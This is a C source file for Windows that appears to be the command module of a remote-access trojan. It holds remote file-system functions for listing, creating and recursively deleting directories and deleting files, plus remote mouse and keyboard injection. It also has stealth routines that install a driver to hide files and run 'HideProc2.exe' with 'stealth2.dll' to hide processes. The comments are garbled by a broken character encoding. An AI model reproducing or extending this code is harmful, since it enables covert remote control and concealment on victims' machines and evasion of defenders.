#include "setdriver.h"
//#include "SceenShoot.h"


#define specify_dir "C:\\\0"


//Shell����

bool ListDir(char *filedir,char* ret)//��Ŀ¼
{
	TCHAR path[MAX_PATH]={0};
	strcpy(path, filedir);
	strcat(path, "\\*");


	WIN32_FIND_DATA ffd;
	HANDLE hFind;


	hFind = FindFirstFile(path, &ffd);

	if (INVALID_HANDLE_VALUE == hFind)
	{
		return false;
	}

	do
	{
		strcat(ret, ffd.cFileName);
		if(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			strcat(ret, "<DIR>");
		}
		strcat(ret,"\r\n");
	}while(FindNextFile(hFind, &ffd) != 0);

	strcat(ret,"\0");

	FindClose(hFind);
	return true;
}


bool CrtDir(char *filedir) //��Ŀ¼
{
	if(CreateDirectory(filedir, NULL))
		return true;
	else{
		printf("errorcode: %d\n",GetLastError());
		return false;
	}
}


bool DltDirTvs(TCHAR filedir[]) //ɾĿ¼���õı�������
{

	TCHAR path[MAX_PATH];
	strcpy(path, filedir);
	strcat(path,"\\*");

	WIN32_FIND_DATA ffd;
	HANDLE hFind ;

	hFind = FindFirstFile(path, &ffd);	

	if (INVALID_HANDLE_VALUE == hFind)
	{
		return false;
	}

	do
	{
		if (ffd.cFileName[0] != '.'){

			if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				DltDirTvs(ffd.cFileName);
				RemoveDirectory(ffd.cFileName);
			}
			else
			{
				DeleteFile(ffd.cFileName);
			}

		}
	} while (FindNextFile(hFind, &ffd) != 0);


	FindClose(hFind);
	return true;
}


bool DltDir(char *filedir) //ɾĿ¼
{
	if (strcmp(filedir, specify_dir) == 0){//��ȫ�Լ��
		return false;
	}
	else{
		DltDirTvs(filedir);
		if(RemoveDirectory(filedir))
			return true;
		else{
			printf("errorcode: %d\n",GetLastError());
			return false;
		}
	}
}


bool deletfile(char *filedir)//ɾ�ļ�����
{
	if(DeleteFile(filedir))
		return true;
	else{
		printf("errorcode: %d\n",GetLastError());
		return false;
	}

}


//Զ���������

void mouse_op(int x,int y){
	x = x * 65535 / 1095;
	y = y * 65535 / 616;
	mouse_event(MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE, x, y, 0, 0);
	mouse_event(MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_LEFTUP,x,y,0,0);
	Sleep(100);
	mouse_event(MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE, x, y, 0, 0);
	mouse_event(MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_LEFTUP,x,y,0,0);
}


void keybd_op(int key){
	keybd_event(key, 0, 0, 0);
	keybd_event(key, 0, KEYEVENTF_KEYUP, 0);
}


//�ļ�����

void hide_file(){
	//ִ���ļ����أ���װ����
	setdriver(Install_Run);
}


void show_file(){
	//ȡ���ļ����أ�ж������
	setdriver(Stop_Unload);
}


//���̲���

void hide_process(){
	//ִ�н������أ���װ����
	system("C:\\HideProc2.exe -hide stealth2.dll");
}


void show_process(){
	// ȡ���������أ�ж�ع���
	system("C:\\HideProc2.exe -show stealth2.dll");
}